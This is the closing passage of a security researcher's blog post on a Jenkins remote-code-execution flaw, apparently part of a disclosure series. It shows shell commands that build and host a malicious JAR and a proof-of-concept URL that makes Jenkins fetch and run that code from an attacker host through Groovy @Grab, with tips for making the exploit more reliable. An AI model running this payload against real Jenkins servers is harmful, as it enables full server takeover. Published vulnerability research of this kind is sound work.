+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">javac Orange.java</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> -p META-INF/services/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> Orange &gt; META-INF/services/org.codehaus.groovy.plugins.Runners</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find .</span></span><br><span class="line">./Orange.java</span><br><span class="line">./Orange.class</span><br><span class="line">./META-INF</span><br><span class="line">./META-INF/services</span><br><span class="line">./META-INF/services/org.codehaus.groovy.plugins.Runners</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">jar cvf poc-1.jar ./Orange.class /META-INF/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> poc-1.jar ~/www/tw/orange/poc/1/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -I http://[your_host]/tw/orange/poc/1/poc-1.jar</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 02 Feb 2019 11:10:55 GMT</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC:"></a><strong>PoC:</strong></h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile</span><br><span class="line">?value=</span><br><span class="line">@GrabConfig(disableChecksums=true)%0a</span><br><span class="line">@GrabResolver(name=&#x27;orange.tw&#x27;, root=&#x27;http://[your_host]/&#x27;)%0a</span><br><span class="line">@Grab(group=&#x27;tw.orange&#x27;, module=&#x27;poc&#x27;, version=&#x27;1&#x27;)%0a</span><br><span class="line">import Orange;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Video"><a href="#Video" class="headerlink" title="Video:"></a><strong>Video:</strong></h4><iframe allowfullscreen="" height="315" src="https://www.youtube.com/embed/abuH-j-6-s0" width="560"></iframe>  
+
+
+<h1 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h1><p>With the exploit, we can gain full access on remote Jenkins server! We use Meta-Programming to import malicious JAR file during compile-time, and executing arbitrary code by the Runner service! Although there is a built-in Groovy Sandbox(<a target="_blank" rel="noopener" href="https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin">Script Security Plugin</a>) on Jenkins to protect the Pipeline, it’s useless because the vulnerability is in compile-time, not in run-time!  </p>
+<p>Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected! It breaks the developer’s thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! That’s what makes this vulnerability interesting. Aside from entry points <code>doCheckScriptCompile(...)</code> and <code>toJson(...)</code> I reported, after the vulnerability has been fixed, <a target="_blank" rel="noopener" href="https://twitter.com/0ang3el">Mikhail Egorov</a> also found another <a target="_blank" rel="noopener" href="https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292">entry point</a> quickly to trigger this vulnerability!  </p>
+<p>Apart from that, this vulnerability can also be chained with my previous exploit on <a href="https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html">Hacking Jenkins Part 1</a> to bypass the Overall&#x2F;Read restriction to a well-deserved pre-auth remote code execution. If you fully understand the article, you know how to chain :P  </p>
+<p>Thank you for reading this article and hope you like it! Here is the end of Hacking Jenkins series, I will publish more interesting researches in the future :)</p>
+<h1 id="Updates"><a href="#Updates" class="headerlink" title="Updates"></a>Updates</h1><h4 id="2019-07-02-updated"><a href="#2019-07-02-updated" class="headerlink" title="2019&#x2F;07&#x2F;02 updated"></a>2019&#x2F;07&#x2F;02 updated</h4><blockquote class="twitter-tweet"><p lang="en" dir="ltr">My slides &quot;Hacking Jenkins&quot; for <a target="_blank" rel="noopener" href="https://twitter.com/hashtag/pts19?src=hash&amp;ref_src=twsrc%5Etfw">#pts19</a> and <a target="_blank" rel="noopener" href="https://twitter.com/hashtag/HITBAMS?src=hash&amp;ref_src=twsrc%5Etfw">#HITBAMS</a> is out! This is my first time to go French and Pass the SALT(<a target="_blank" rel="noopener" href="https://twitter.com/passthesaltcon?ref_src=twsrc%5Etfw">@passthesaltcon</a>) is such a really really good and interesting conference!<a target="_blank" rel="noopener" href="https://t.co/S4VUf3k1Zq">https://t.co/S4VUf3k1Zq</a></p>&mdash; Orange Tsai 🍊 (@orange_8361) <a target="_blank" rel="noopener" href="https://twitter.com/orange_8361/status/1146364203390947330?ref_src=twsrc%5Etfw">July 3, 2019</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+
+<h4 id="2019-05-10-updated"><a href="#2019-05-10-updated" class="headerlink" title="2019&#x2F;05&#x2F;10 updated"></a>2019&#x2F;05&#x2F;10 updated</h4><blockquote class="twitter-tweet"><p lang="en" dir="ltr">&quot;There is no pre-auth RCE in Jenkins since May 2017, but this is the one!&quot;<br>Relase a more reliable and elegant exploit - &quot;awesome-jenkins-rce-2019&quot; from my <a target="_blank" rel="noopener" href="https://twitter.com/hashtag/HITB2019AMS?src=hash&amp;ref_src=twsrc%5Etfw">#HITB2019AMS</a> talk. Thanks <a target="_blank" rel="noopener" href="https://twitter.com/0ang3el?ref_src=twsrc%5Etfw">@0ang3el</a> and <a target="_blank" rel="noopener" href="https://twitter.com/webpentest?ref_src=twsrc%5Etfw">@webpentest</a> join this party! <a target="_blank" rel="noopener" href="https://t.co/qQCY2RYDa8">https://t.co/qQCY2RYDa8</a> <a target="_blank" rel="noopener" href="https://t.co/sW0S7bctGT">pic.twitter.com/sW0S7bctGT</a></p>&mdash; Orange Tsai 🍊 (@orange_8361) <a target="_blank" rel="noopener" href="https://twitter.com/orange_8361/status/1126829648552312832?ref_src=twsrc%5Etfw">May 10, 2019</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+
+
+<h4 id="2019-02-22-updated"><a href="#2019-02-22-updated" class="headerlink" title="2019&#x2F;02&#x2F;22 updated"></a>2019&#x2F;02&#x2F;22 updated</h4><blockquote class="twitter-tweet"><p lang="en" dir="ltr">Some tips to make the exploit more reliable!<br>1. Check your Java(JAR) version first!<br>2. There are more than 3 entry points to trigger this vulnerability!<br>3. Sometimes, the `Grab` failed but the `ASTTest` work perfectly! <a target="_blank" rel="noopener" href="https://t.co/NcTFyNIcHR">https://t.co/NcTFyNIcHR</a></p>&mdash; Orange Tsai 🍊 (@orange_8361) <a target="_blank" rel="noopener" href="https://twitter.com/orange_8361/status/1098832738474283008?ref_src=twsrc%5Etfw">February 22, 2019</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
